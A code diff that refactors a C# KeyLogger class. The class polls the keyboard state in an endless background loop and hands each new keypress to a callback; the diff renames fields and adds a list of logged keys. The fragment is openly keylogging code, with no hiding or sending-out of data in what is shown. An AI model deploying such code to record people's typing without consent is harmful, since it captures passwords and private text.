@@ -6,47 +6,50 @@ using System.Collections.Generic;
 namespace keylogger
 {
     public class KeyLogger
-    {
-        public bool start { get; private set; }
+    {            
+        public List<Key>LoggerKeys { get; private set; }
 
-        private Dictionary<Key, bool> keys;
+        private Dictionary<Key, bool> Keys;
+
+        public bool Start { get; private set; }  
 
         public KeyLogger()
         {
-            keys = new Dictionary<Key, bool>();
+            Keys = new Dictionary<Key, bool>();
             for (int i = 1; i < 172; i++)
             {
-                keys.Add((Key)i, true);
+                Keys.Add((Key)i, true);
             }
-            start = false;
+            Start = false;
+            LoggerKeys = new List<Key>();
         }
 
         public void Hook(Action<Key> LogKeys)
         {
             Task.Run(() =>
             {
-                start = true;
+                Start = true;
                 try
                 {
                     while (true)
                     {
-                        foreach (var item in keys)
+                        foreach (var item in Keys)
                         {
                             if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
                             {
                                 LogKeys(item.Key);
-                                keys[item.Key] = false;
+                                Keys[item.Key] = false;
                             }
                             if (Keyboard.IsKeyUp(item.Key))
                             {
-                                keys[item.Key] = true;
+                                Keys[item.Key] = true;
                             }
                         }
                     }
                 }
                 catch (Exception e)
                 {
-                    start = false;
+                    Start = false;
                     return;
                 }
             });
